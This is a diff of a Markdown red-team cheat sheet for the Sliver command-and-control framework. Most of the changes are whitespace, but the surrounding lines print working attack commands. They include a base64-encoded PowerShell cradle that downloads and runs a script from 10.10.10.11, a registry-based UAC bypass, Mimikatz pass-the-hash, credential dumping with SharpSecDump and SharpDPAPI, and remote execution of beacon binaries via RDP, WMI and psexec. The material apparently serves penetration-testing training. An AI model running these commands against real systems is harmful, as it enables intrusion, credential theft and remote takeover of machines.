@@ -151,13 +151,6 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 - [Armory Packages List](#armory-packages-list)
 - [Credits](#credits)
 
-
-
-
-
-
-
-
 ## Q & A
 
 - When I run armory packages with `-i`, I get CLM runtime error, how to resolve? 
@@ -196,12 +189,13 @@ chmod +x ./sliver-server_linux
 
 
 # Operator profile
+
 [server] sliver > new-operator -n <operator_name> -l <listening_IP>
 [*] Generating new client certificate, please wait ... 
 [*] Saved new client config to: /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg 
 
-
 # Enabling Multiplayer mode
+
 [server] sliver > multiplayer
 [*] Multiplayer mode enabled!
 [*] <operator_name> has joined the game
@@ -236,8 +230,6 @@ sliver > armory install all
 ... Complete output at the end ...
 ```
 
-
-
 ## Generic
 
 ### Hosts File 
@@ -261,14 +253,11 @@ sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 172.16.130.0/24
 nmap -p- -sC -sV -A -Pn -n --open --append -oN 10.10.200.100 10.10.200.100
 ```
 
-
 ### Dirsearch
 
 ```powershell
 dirsearch -u http://10.10.200.100/ -t 100 --full-url -x 404
 ```
-
-
 
 ## Initial Foothold
 
@@ -292,7 +281,6 @@ http -L 10.10.10.11 --lport 9090
 profiles new --http 10.10.10.11:8099 --format service osep-lateral
 http -L 10.10.10.11 --lport 8099
 ```
-
 
 ### Payloads
 
@@ -329,7 +317,6 @@ python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char 
 # PowerShell Session
 echo -en "(New-Object System.Net.WebClient).DownloadString('http://10.10.10.11/hav0c-ps.txt') | IEX" | iconv -t UTF-16LE | base64 -w 0
 powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==
-
 
 
 # --
@@ -405,7 +392,6 @@ hollow svchost.exe /home/kali/OSEP/hav0c/sliver.x64.bin
 [!] Call extension error: rpc error: code = Unknown desc = The parameter is incorrect.
 ```
 
-
 ## Bypasses
 
 ### AMSI & CLM
@@ -433,7 +419,6 @@ sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/HostRecon.ps1 -c "In
 New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
 sharpsh -- -e -c TmV3LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcc29mdHdhcmVcY2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQiIC1OYW1lICJEZWxlZ2F0ZUV4ZWN1dGUiIC1WYWx1ZSAiIiAtRm9yY2U=
 
-
 # Running commands with length > 256 characters - Sliver uses donut on backend which only supports 256 chars, run within process using `-i`
 Invoke-Mimikatz -Command "privilege::debug token::elevate `"sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff`" exit"
 sharpsh -i -t 40 -- -u 'http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps1' -e -c SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIHRva2VuOjplbGV2YXRlIGAic2VrdXJsc2E6OnB0aCAvdXNlcjpBZG1pbmlzdHJhdG9yIC9kb21haW46aW5maW5pdHkuY29tIC9udGxtOjVmOTE2M2NhM2I2NzNhZGZmZjI4MjhmMzY4Y2EzNzYwYCIgZXhpdCI=
@@ -446,7 +431,6 @@ sharpsh -i -t 40 -- -u 'http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps
 ```powershell
 execute-assembly -i /home/kali/tools/bins/csharp-files/Stracciatella.exe -c "$ExecutionContext.SessionState.LanguageMode"
 ```
-
 
 ### Application Whitelisting
 
@@ -464,8 +448,6 @@ execute-assembly -i -- /home/kali/tools/bins/csharp-files/SharpUp.exe audit
 # inline-execute-assembly
 inline-execute-assembly /home/kali/tools/bins/csharp-files/SharpUp.exe audit
 ```
-
-
 
 ## Privileges Escalation
 
@@ -543,7 +525,7 @@ execute -o net localgroup administrators
 ```
 
 
-### SeImpersonatePrivileges
+### `SeImpersonatePrivileges`
 
 > Try EfsRpc if the by default way does not work with SweetPotato
 
@@ -2325,7 +2307,8 @@ execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/dev
 
 ### mssqlclient-ng
 
-> [mssqlclient-ng](https://github.com/n3rada/mssqlclient-ng) - Linux-side MS SQL client. Ideal for PTH, Kerberos, and external access through a SOCKS5 proxy from your beacon.
+>
+> [mssqlclient-ng](https://github.com/n3rada/mssqlclient-ng) Linux-side MS SQL client. Ideal for PTH, Kerberos, and external access through a SOCKS5 proxy from your beacon.
 
 ```shell
 # Windows authentication with password
@@ -2547,10 +2530,7 @@ Get-SQLQuery -Instance "192.168.130.10" -Query "SELECT name, principal_id, type_
 Invoke-SQLUncPathInjection -Instance 192.168.130.10 -Verbose -CaptureIp 10.10.10.11
 ```
 
-
-
 ## Armory
-
 
 ### SharpLaps
 
@@ -2579,8 +2559,6 @@ sharp-hound-4
 sharp-hound-4 -- '-C all'
 ```
 
-
-
 ### SharpSecDump
 
 Port of impacket-secretsdump but within C# - handy.
@@ -2588,8 +2566,6 @@ Port of impacket-secretsdump but within C# - handy.
 ```powershell
 sharpsecdump -- -target=machine02.domain.com -u=Administrator -d=. -p='password'
 ```
-
-
 
 
 ### sharpsh
@@ -2602,8 +2578,6 @@ sharpsh -- -c '$ExecutionContext.SessionState.LanguageMode'
 sharpsh -- '-c "whoami /all"'
 ```
 
-
-
 ### SharpMapExec
 
 Whole description -> https://github.com/cube0x0/SharpMapExec
@@ -2613,17 +2587,12 @@ Whole description -> https://github.com/cube0x0/SharpMapExec
 sharpmapexec -- 'ntlm winrm /user:Administrator /password:"password" /domain:. /computername:machine02.domain.com /m:enable_winrm'
 ```
 
-
-
 ### SharpUp
-
 
 ```powershell
 sharpup
 sharpup audit
 ```
-
-
 
 ### SharpRDP
 
@@ -2649,17 +2618,12 @@ ls //machine06/c$/windows/temp/
 sharprdp -- computername=machine06 password=password username=Administrator command=C:\\Windows\\Temp\\sliver2.beacon.exe
 ```
 
-
-
-
 ### Rubeus
 
 ```powershell
 rubeus -- tgtdeleg /nowrap
 rubeus -t 30 -- monitor /interval:5 /runfor:15 /nowrap
 ```
-
-
 
 ### NoPowerShell
 
@@ -2673,8 +2637,6 @@ nps 'Get-ADUser -Filter *'
 nps Get-Command
 ```
 
-
-
 ### Sharp-SMBExec
 
 ```powershell
@@ -2682,9 +2644,6 @@ Sharp-SMBExec.exe hash:"hash" username:"username" domain:"domain.tld" target:"ta
 
 sharp-smbexec hash:"ffffffffffffffffffffffffffffffff" username:"Administrator" domain:"infinity.com" target:"machine02.domain.com" command:"ls"
 ```
-
-
-
 
 ### SharpDPAPI
 
@@ -2699,8 +2658,6 @@ sharpdpapi vaults
 sharpdpapi machinemasterkeys
 ```
 
-
-
 ### SharpWMI
 
 ```powershell
@@ -2712,20 +2669,13 @@ sharp-wmi action=exec computername=machine02.domain.com command=C:\\Windows\\Tem
 
 runas -d . -u Administrator -P 'password' -n -p C:\\Windows\\tasks\\sliver.beacon.exe
 
-
-
-
 upload /home/kali/OSEP/hav0c/sliver.beacon.exe //machine06/c$/windows/temp/sliver2.beacon.exe
 ls //machine06/c$/windows/temp/
-
 
 # Execute using sharprdp
 sharprdp -- computername=machine06 password='password' username=Administrator command=C:\\Windows\\Temp\\sliver2.beacon.exe
 
 ```
-
-
-
 
 ## BOFs
 
@@ -2741,7 +2691,6 @@ jump-psexec dc04 AgentSvc /home/kali/OSEP/hav0c/sliver.x64.exe //dc04/c$/file2.e
 ```powershell
 jump-wmiexec client09 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
 ```
-
 
 ## Armory Packages List
 
